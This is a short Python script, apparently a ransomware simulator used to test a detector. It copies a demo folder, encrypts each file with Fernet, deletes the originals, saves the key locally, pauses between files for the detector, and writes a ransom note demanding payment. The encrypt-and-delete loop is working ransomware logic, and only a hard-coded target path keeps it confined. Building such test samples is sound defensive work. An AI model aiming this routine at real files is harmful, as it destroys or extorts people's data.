#!/usr/bin/env python3
# fake_ransom.py (slowed) - encrypts the fixed attack_target_fixed folder (demo)
import os, shutil, sys, json, time
from datetime import datetime
from cryptography.fernet import Fernet

BASE = os.path.dirname(__file__)
SRC_DIR = os.path.join(BASE, "test_files")
TARGET_DIR = os.path.join(BASE, "attack_target_fixed")
KEY_FILE = os.path.join(BASE, "session_key_fixed.key")
RANSOM_NOTE = "__RANSOM_NOTE.txt"

def copy_source_to_target():
    if os.path.exists(TARGET_DIR):
        shutil.rmtree(TARGET_DIR)
    shutil.copytree(SRC_DIR, TARGET_DIR)
    print(f"[+] Created/Reset duplicate attack target at: {TARGET_DIR}")

def encrypt_target(delay=0.12):
    key = Fernet.generate_key()
    cipher = Fernet(key)
    with open(KEY_FILE, "wb") as kf:
        kf.write(key)
    enc_count = 0
    for root, dirs, files in os.walk(TARGET_DIR):
        for fname in files:
            path = os.path.join(root, fname)
            if fname == RANSOM_NOTE:
                continue
            try:
                with open(path, "rb") as f:
                    data = f.read()
                enc = cipher.encrypt(data)
                with open(path + ".enc", "wb") as ef:
                    ef.write(enc)
                os.remove(path)
                enc_count += 1
                # tiny pause to allow detector to observe and act
                time.sleep(delay)
            except Exception as e:
                print(f"Error encrypting {path}: {e}")
    note = "Your files have been encrypted. You need to pay 25000 if you want your files back"
    with open(os.path.join(TARGET_DIR, RANSOM_NOTE), "w") as nf:
        nf.write(note)
    print(f"[+] Encrypted {enc_count} file(s) in {TARGET_DIR}. Key saved to {KEY_FILE}")
    return {"target_dir": TARGET_DIR, "key_file": KEY_FILE, "encrypted_files": enc_count}

if __name__ == "__main__":
    copy_source_to_target()
    res = encrypt_target()
    print(json.dumps(res))
